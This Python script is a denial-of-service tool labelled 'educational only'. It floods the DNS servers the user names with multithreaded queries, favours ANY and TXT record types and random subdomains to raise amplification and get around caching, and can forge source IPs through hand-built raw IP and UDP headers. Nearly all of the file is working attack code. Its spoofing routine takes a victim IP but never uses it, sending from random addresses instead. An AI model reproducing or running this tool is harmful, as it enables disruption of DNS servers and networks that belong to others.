#!/usr/bin/env python3
"""
DNS Flood Attack Implementation with REAL IP Spoofing
EDUCATIONAL PURPOSES ONLY - Requires root privileges
"""

import socket
import random
import struct
import threading
import time
import sys
import argparse
from rich.console import Console
from rich.progress import Progress, BarColumn, TextColumn, TimeRemainingColumn

console = Console()

# Color codes for console output
class conf:
    RED = "\033[91m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    BLUE = "\033[94m"
    MAGENTA = "\033[95m"
    CYAN = "\033[96m"
    WHITE = "\033[97m"
    RESET = "\033[0m"
    DIM = "\033[2m"

class DnsFloodProgressUpdater:
    """Track and display attack progress"""
    
    def __init__(self, duration=120, silent=False):
        self.duration = duration
        self.silent = silent
        self.packets_sent = 0
        self.failures = 0
        self.start_time = None
        self.running = False
        
        # Setup progress display
        self.progress = Progress(
            TextColumn("[progress.description]{task.description}"),
            BarColumn(),
            TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
            TextColumn("•"),
            TextColumn("[progress.completed]{task.completed}/[progress.total]{task.total} packets"),
            TextColumn("•"),
            TextColumn("{task.fields[rate]:.1f} p/s"),
            TextColumn("•"),
            TimeRemainingColumn(),
            console=console,
            disable=silent
        )
        self.task = self.progress.add_task("[red]Attacking...", total=duration, rate=0)
    
    def start(self):
        """Start progress tracking"""
        self.start_time = time.time()
        self.running = True
        if not self.silent:
            self.progress.start()
    
    def stop(self):
        """Stop progress tracking"""
        self.running = False
        if not self.silent:
            self.progress.stop()
    
    def increment_packets(self, count=1):
        """Update packet count"""
        self.packets_sent += count
        if self.running and not self.silent:
            elapsed = time.time() - self.start_time
            current_rate = self.packets_sent / elapsed if elapsed > 0 else 0
            self.progress.update(self.task, advance=0, rate=current_rate)
    
    def increment_failures(self, count=1):
        """Update failure count"""
        self.failures += count
    
    def get_progress_info(self):
        """Get current progress information"""
        elapsed = time.time() - self.start_time if self.start_time else 0
        current_rate = self.packets_sent / elapsed if elapsed > 0 else 0
        average_rate = self.packets_sent / self.duration if self.duration > 0 else 0
        
        return {
            "packets_sent": self.packets_sent,
            "failures": self.failures,
            "elapsed_time": elapsed,
            "current_rate": current_rate,
            "average_rate": average_rate
        }
    
    def print_summary(self):
        """Print attack summary"""
        info = self.get_progress_info()
        console.print(f"\n{conf.GREEN}✓ Attack completed{conf.RESET}")
        console.print(f"{conf.GREEN}Duration: {info['elapsed_time']:.1f}s{conf.RESET}")
        console.print(f"{conf.GREEN}Packets sent: {info['packets_sent']}{conf.RESET}")
        console.print(f"{conf.GREEN}Average rate: {info['average_rate']:.1f} packets/second{conf.RESET}")
        
        if info['failures'] > 0:
            console.print(f"{conf.YELLOW}Failures: {info['failures']}{conf.RESET}")

class DnsFlood:
    """DNS Flood Attack with REAL IP Spoofing (Educational Only)"""
    
    def __init__(self, dns_servers, duration=120, query_rate=1000, threads=10, 
                 verbose=False, silent=False, amplification=True, spoof_source=False,
                 use_any_query=True, use_txt_query=True, random_subdomains=True,
                 target_ip=None):
        """
        Initialize DNS Flood attack with amplification options
        
        Args:
            dns_servers (list): List of DNS server IP addresses
            duration (int): Attack duration in seconds
            query_rate (int): Queries per second per thread
            threads (int): Number of attack threads
            verbose (bool): Enable verbose output
            silent (bool): Enable silent mode (no progress display)
            amplification (bool): Enable amplification techniques
            spoof_source (bool): WARNING: Spoof source IP (ILLEGAL for real attacks)
            use_any_query (bool): Use ANY queries for maximum amplification
            use_txt_query (bool): Use TXT queries for good amplification
            random_subdomains (bool): Use random subdomains to bypass caching
            target_ip (str): Target IP for spoofed attacks (victim IP)
        """
        self.dns_servers = dns_servers
        self.duration = duration
        self.query_rate = query_rate
        self.num_threads = threads
        self.verbose = verbose
        self.amplification = amplification
        self.spoof_source = spoof_source
        self.use_any_query = use_any_query
        self.use_txt_query = use_txt_query
        self.random_subdomains = random_subdomains
        self.target_ip = target_ip
        
        # Common domains known to have large responses (for amplification)
        self.large_response_domains = [
            "isc.org", "ripe.net", "cloudflare.com", "google.com",
            "microsoft.com", "facebook.com", "amazon.com", "twitter.com"
        ]
        
        # Attack state
        self.running = False
        self.start_time = None
        self.threads = []
        
        # Initialize progress updater
        self.progress = DnsFloodProgressUpdater(duration=duration, silent=silent)
        
        # Raw socket for spoofing (requires root)
        self.raw_socket = None
        if spoof_source:
            self._setup_raw_socket()
        
        # Warning for spoofing
        if spoof_source:
            console.print(f"\n{conf.RED}⚠️  WARNING: Source IP spoofing is enabled.{conf.RESET}")
            console.print(f"{conf.RED}   This is ILLEGAL for real attacks and for educational/testing purposes only!{conf.RESET}")
            console.print(f"{conf.RED}   Use only on your own networks with proper authorization.{conf.RESET}")
            console.print(f"{conf.RED}   Target IP: {target_ip}{conf.RESET}\n")
            time.sleep(2)
    
    def _setup_raw_socket(self):
        """Set up raw socket for IP spoofing (requires root privileges)"""
        try:
            # Create raw socket with IPPROTO_RAW for manual IP header construction
            self.raw_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            self.raw_socket.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            console.print(f"{conf.GREEN}✓ Raw socket created for IP spoofing{conf.RESET}")
        except PermissionError:
            console.print(f"{conf.RED}❌ Root/Administrator privileges required for IP spoofing!{conf.RESET}")
            console.print(f"{conf.RED}   Falling back to normal socket without spoofing{conf.RESET}")
            self.spoof_source = False
            self.raw_socket = None
        except Exception as e:
            console.print(f"{conf.RED}❌ Raw socket creation failed: {str(e)}{conf.RESET}")
            self.spoof_source = False
            self.raw_socket = None
    
    def create_ip_header(self, source_ip, dest_ip, data):
        """Create a custom IP header for spoofing"""
        # IP header fields
        ip_ihl = 5
        ip_ver = 4
        ip_tos = 0
        ip_tot_len = 20 + len(data)  # IP header + data
        ip_id = random.randint(0, 65535)
        ip_frag_off = 0
        ip_ttl = 255
        ip_proto = socket.IPPROTO_UDP
        ip_check = 0  # Will be calculated later
        
        # Pack the IP header
        ip_ihl_ver = (ip_ver << 4) + ip_ihl
        
        # Source and destination IP addresses
        src_addr = socket.inet_aton(source_ip)
        dst_addr = socket.inet_aton(dest_ip)
        
        # Header structure without checksum
        ip_header = struct.pack('!BBHHHBBH4s4s',
                            ip_ihl_ver,    # Version & IHL
                            ip_tos,        # Type of service
                            ip_tot_len,    # Total length
                            ip_id,         # Identification
                            ip_frag_off,   # Fragment offset
                            ip_ttl,        # Time to live
                            ip_proto,      # Protocol
                            ip_check,      # Header checksum
                            src_addr,      # Source address
                            dst_addr)      # Destination address
        
        # Calculate checksum
        ip_check = self.calculate_checksum(ip_header)
        
        # Repack with correct checksum
        ip_header = struct.pack('!BBHHHBBH4s4s',
                            ip_ihl_ver,
                            ip_tos,
                            ip_tot_len,
                            ip_id,
                            ip_frag_off,
                            ip_ttl,
                            ip_proto,
                            ip_check,
                            src_addr,
                            dst_addr)
        
        return ip_header
    
    def create_udp_header(self, source_ip, dest_ip, source_port, dest_port, data):
        """Create UDP header with pseudo-header for checksum calculation"""
        # UDP header fields
        udp_len = 8 + len(data)
        udp_check = 0
        
        # Pack UDP header
        udp_header = struct.pack('!HHHH', source_port, dest_port, udp_len, udp_check)
        
        # Pseudo-header for checksum calculation
        src_addr = socket.inet_aton(source_ip)
        dst_addr = socket.inet_aton(dest_ip)
        placeholder = 0
        protocol = socket.IPPROTO_UDP
        
        pseudo_header = struct.pack('!4s4sBBH',
                                src_addr,
                                dst_addr,
                                placeholder,
                                protocol,
                                udp_len)
        
        # Calculate checksum including pseudo-header
        udp_check = self.calculate_checksum(pseudo_header + udp_header + data)
        
        # Repack with correct checksum
        udp_header = struct.pack('!HHHH', source_port, dest_port, udp_len, udp_check)
        
        return udp_header
    
    def calculate_checksum(self, data):
        """Calculate IP/UDP checksum"""
        if len(data) % 2 == 1:
            data += b'\x00'
        
        checksum = 0
        for i in range(0, len(data), 2):
            word = (data[i] << 8) + data[i+1]
            checksum += word
            checksum = (checksum & 0xffff) + (checksum >> 16)
        
        return ~checksum & 0xffff
    
    def generate_random_domain(self):
        """Generate a random domain or subdomain for DNS queries"""
        letters = "abcdefghijklmnopqrstuvwxyz0123456789"
        
        if self.random_subdomains:
            # Generate random subdomain for cache busting
            subdomain = "".join(random.choice(letters) for _ in range(random.randint(8, 15)))
            base_domain = random.choice(self.large_response_domains)
            return f"{subdomain}.{base_domain}"
        else:
            # Use base domain only
            return random.choice(self.large_response_domains)
    
    def get_query_type(self):
        """Choose query type based on amplification settings"""
        if not self.amplification:
            return 1  # Standard A record
        
        # Weighted random selection for amplification queries
        query_types = []
        weights = []
        
        # A records (base weight)
        query_types.append(1)  # A record
        weights.append(30)     # 30% weight
        
        if self.use_any_query:
            query_types.append(255)  # ANY record
            weights.append(40)       # 40% weight - highest amplification
        
        if self.use_txt_query:
            query_types.append(16)   # TXT record
            weights.append(30)       # 30% weight - good amplification
        
        # Choose query type based on weights
        return random.choices(query_types, weights=weights, k=1)[0]
    
    def get_query_type_name(self, query_type):
        """Get human-readable name for query type"""
        types = {
            1: "A",
            16: "TXT", 
            255: "ANY"
        }
        return types.get(query_type, f"UNKNOWN({query_type})")
    
    def create_dns_query(self, domain, query_type):
        """
        Create a DNS query packet for amplification
        
        Args:
            domain (str): Domain name to query
            query_type (int): DNS query type (1=A, 16=TXT, 255=ANY)
            
        Returns:
            bytes: DNS query packet
        """
        try:
            # Generate random transaction ID
            transaction_id = random.randint(0, 65535)
            
            # DNS header - set recursion desired for larger responses
            flags = struct.pack(">H", 0x0100)  # Standard query, recursion desired
            num_queries = struct.pack(">H", 1)
            num_answers = struct.pack(">H", 0)
            num_authority = struct.pack(">H", 0)
            num_additional = struct.pack(">H", 0)
            
            # Encode domain name
            encoded_domain = b""
            for label in domain.split("."):
                encoded_domain += struct.pack(">B", len(label)) + label.encode()
            encoded_domain += b"\x00"  # Null terminator
            
            # Query type and class (IN)
            query_type_packed = struct.pack(">H", query_type)
            query_class = struct.pack(">H", 1)  # IN class
            
            # Construct complete packet
            packet = (
                struct.pack(">H", transaction_id) +
                flags +
                num_queries +
                num_answers +
                num_authority +
                num_additional +
                encoded_domain +
                query_type_packed +
                query_class
            )
            
            return packet
            
        except Exception as e:
            self.progress.increment_failures(1)
            if self.verbose:
                console.print(f"{conf.RED}Query creation failed: {str(e)}{conf.RESET}")
            return None
    
    def send_spoofed_dns_query(self, target_ip, dns_server_ip, query):
        """Send a DNS query with spoofed source IP"""
        try:
            # Generate random source IP and port for spoofing
            spoofed_ip = f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
            spoofed_port = random.randint(1024, 65535)
            
            # Create UDP header
            udp_header = self.create_udp_header(spoofed_ip, dns_server_ip, spoofed_port, 53, query)
            
            # Create IP header
            ip_header = self.create_ip_header(spoofed_ip, dns_server_ip, udp_header + query)
            
            # Send the spoofed packet
            self.raw_socket.sendto(ip_header + udp_header + query, (dns_server_ip, 53))
            
            # Update progress
            self.progress.increment_packets(1)
            
            return True
            
        except Exception as e:
            self.progress.increment_failures(1)
            if self.verbose:
                console.print(f"{conf.RED}Spoofed query failed: {str(e)}{conf.RESET}")
            return False
    
    def send_normal_dns_query(self, dns_server_ip, query):
        """Send a normal DNS query (non-spoofed)"""
        try:
            # Determine socket type (IPv4 vs IPv6)
            sock_family = socket.AF_INET6 if ":" in dns_server_ip else socket.AF_INET
            
            # Send query
            with socket.socket(sock_family, socket.SOCK_DGRAM) as sock:
                sock.settimeout(1.0)  # 1 second timeout
                sock.sendto(query, (dns_server_ip, 53))
                
                # Update progress
                self.progress.increment_packets(1)
                
            return True
            
        except Exception as e:
            self.progress.increment_failures(1)
            if self.verbose:
                console.print(f"{conf.RED}Query failed: {str(e)}{conf.RESET}")
            return False
    
    def send_dns_queries(self):
        """Worker thread function to send amplified DNS queries"""
        end_time = time.time() + self.duration
        
        while self.running and time.time() < end_time:
            try:
                # Select random target server
                target_ip = random.choice(self.dns_servers)
                
                # Generate domain and query type for amplification
                domain = self.generate_random_domain()
                query_type = self.get_query_type()
                
                # Create DNS query
                query = self.create_dns_query(domain, query_type)
                if not query:
                    continue
                
                # Send the query (spoofed or normal)
                if self.spoof_source and self.raw_socket:
                    success = self.send_spoofed_dns_query(self.target_ip, target_ip, query)
                else:
                    success = self.send_normal_dns_query(target_ip, query)
                
                # Verbose output with query type info
                if self.verbose and success and self.progress.packets_sent % 500 == 0:
                    info = self.progress.get_progress_info()
                    qtype_name = self.get_query_type_name(query_type)
                    mode = "SPOOFED" if self.spoof_source else "NORMAL"
                    console.print(f"{conf.YELLOW}[DEBUG] {mode} {qtype_name} query for {domain}, Rate: {info['current_rate']:.1f} pps{conf.RESET}")
                
                # Rate limiting
                if self.query_rate > 0:
                    time.sleep(1.0 / self.query_rate)
                    
            except socket.timeout:
                # Timeouts are expected and not counted as failures
                pass
            except Exception as e:
                self.progress.increment_failures(1)
                if self.verbose:
                    console.print(f"{conf.RED}Query failed: {str(e)}{conf.RESET}")
                time.sleep(0.001)  # Brief pause on error
    
    def start(self):
        """
        Start the amplified DNS flood attack
        
        Returns:
            dict: Attack results
        """
        try:
            console.print(f"{conf.RED}🚀 Starting Amplified DNS Flood Attack...{conf.RESET}")
            console.print(f"{conf.DIM}Target servers: {', '.join(self.dns_servers)}{conf.RESET}")
            console.print(f"{conf.DIM}Duration: {self.duration}s, Threads: {self.num_threads}, Rate: {self.query_rate} qps/thread{conf.RESET}")
            
            if self.amplification:
                console.print(f"{conf.DIM}Amplification: {conf.GREEN}ENABLED{conf.RESET}")
                techniques = []
                if self.use_any_query: techniques.append("ANY queries")
                if self.use_txt_query: techniques.append("TXT queries")
                if self.random_subdomains: techniques.append("Random subdomains")
                console.print(f"{conf.DIM}Techniques: {', '.join(techniques)}{conf.RESET}")
            
            if self.spoof_source:
                console.print(f"{conf.DIM}Spoofing: {conf.RED}ENABLED{conf.RESET}")
                console.print(f"{conf.DIM}Target IP: {self.target_ip}{conf.RESET}")
            
            # Initialize attack state
            self.running = True
            self.start_time = time.time()
            
            # Start progress updater
            self.progress.start()
            
            # Start worker threads
            for i in range(self.num_threads):
                thread = threading.Thread(target=self.send_dns_queries, name=f"DNSFlood-{i}")
                thread.daemon = True
                thread.start()
                self.threads.append(thread)
            
            # Monitor attack progress
            try:
                while self.running and (time.time() - self.start_time) < self.duration:
                    time.sleep(0.5)
            except KeyboardInterrupt:
                console.print(f"\n{conf.YELLOW}Attack interrupted by user{conf.RESET}")
            
            # Stop attack
            self.running = False
            
            # Wait for threads to finish
            for thread in self.threads:
                thread.join(timeout=2.0)
            
            # Stop progress updater
            self.progress.stop()
            
            # Calculate results
            duration = time.time() - self.start_time
            info = self.progress.get_progress_info()
            
            # Print summary
            if not self.progress.silent:
                self.progress.print_summary()
            else:
                console.print(f"\n{conf.GREEN}✓ Attack completed{conf.RESET}")
                console.print(f"{conf.GREEN}Duration: {duration:.1f}s{conf.RESET}")
                console.print(f"{conf.GREEN}Packets sent: {info['packets_sent']}{conf.RESET}")
                console.print(f"{conf.GREEN}Average rate: {info['average_rate']:.1f} packets/second{conf.RESET}")
                
                if info['failures'] > 0:
                    console.print(f"{conf.YELLOW}Failures: {info['failures']}{conf.RESET}")
            
            return {
                "dns_servers": self.dns_servers,
                "duration": int(duration),
                "packets_sent": info['packets_sent'],
                "failures": info['failures'],
                "query_rate": self.query_rate,
                "threads": self.num_threads,
                "average_rate": info['average_rate'],
                "amplification": self.amplification,
                "spoofing": self.spoof_source,
                "estimated_amplification_factor": self._estimate_amplification_factor()
            }
            
        except Exception as e:
            console.print(f"{conf.RED}Attack failed: {str(e)}{conf.RESET}")
            self.running = False
            self.progress.stop()
            raise
    
    def _estimate_amplification_factor(self):
        """Estimate the amplification factor based on query types used"""
        if not self.amplification:
            return 1.0
        
        # Estimated response sizes (in bytes) for different query types
        # These are approximate values - real values vary by domain
        estimated_sizes = {
            1: 100,    # A record - small response
            16: 500,   # TXT record - medium response
            255: 2000  # ANY record - large response
        }
        
        # Calculate weighted average based on query type distribution
        total_weight = 30  # A records
        weighted_size = 30 * estimated_sizes[1]
        
        if self.use_any_query:
            total_weight += 40
            weighted_size += 40 * estimated_sizes[255]
        
        if self.use_txt_query:
            total_weight += 30
            weighted_size += 30 * estimated_sizes[16]
        
        avg_response_size = weighted_size / total_weight
        avg_query_size = 60  # Approximate query size
        
        return avg_response_size / avg_query_size
    
    def stop(self):
        """Stop the attack"""
        self.running = False
        self.progress.stop()
        if self.raw_socket:
            self.raw_socket.close()
        console.print(f"{conf.YELLOW}Stopping attack...{conf.RESET}")

def main():
    """Main function to run DNS flood attack"""
    parser = argparse.ArgumentParser(description="DNS Flood Attack Tool (Educational Only)")
    parser.add_argument("dns_servers", nargs="+", help="DNS server IP addresses to target")
    parser.add_argument("-d", "--duration", type=int, default=120, help="Attack duration in seconds")
    parser.add_argument("-r", "--rate", type=int, default=1000, help="Queries per second per thread")
    parser.add_argument("-t", "--threads", type=int, default=10, help="Number of attack threads")
    parser.add_argument("--no-amplification", action="store_true", help="Disable amplification techniques")
    parser.add_argument("--spoof", metavar="TARGET_IP", help="Enable IP spoofing (REQUIRES ROOT)")
    parser.add_argument("--no-any", action="store_true", help="Disable ANY queries")
    parser.add_argument("--no-txt", action="store_true", help="Disable TXT queries")
    parser.add_argument("--no-random", action="store_true", help="Disable random subdomains")
    parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose output")
    parser.add_argument("-s", "--silent", action="store_true", help="Enable silent mode")
    
    args = parser.parse_args()
    
    try:
        # Create and run attack
        attack = DnsFlood(
            dns_servers=args.dns_servers,
            duration=args.duration,
            query_rate=args.rate,
            threads=args.threads,
            verbose=args.verbose,
            silent=args.silent,
            amplification=not args.no_amplification,
            spoof_source=args.spoof is not None,
            use_any_query=not args.no_any,
            use_txt_query=not args.no_txt,
            random_subdomains=not args.no_random,
            target_ip=args.spoof
        )
        
        results = attack.start()
        
    except KeyboardInterrupt:
        console.print(f"\n{conf.YELLOW}Attack interrupted by user{conf.RESET}")
    except Exception as e:
        console.print(f"{conf.RED}Error: {str(e)}{conf.RESET}")
        sys.exit(1)

if __name__ == "__main__":
    main()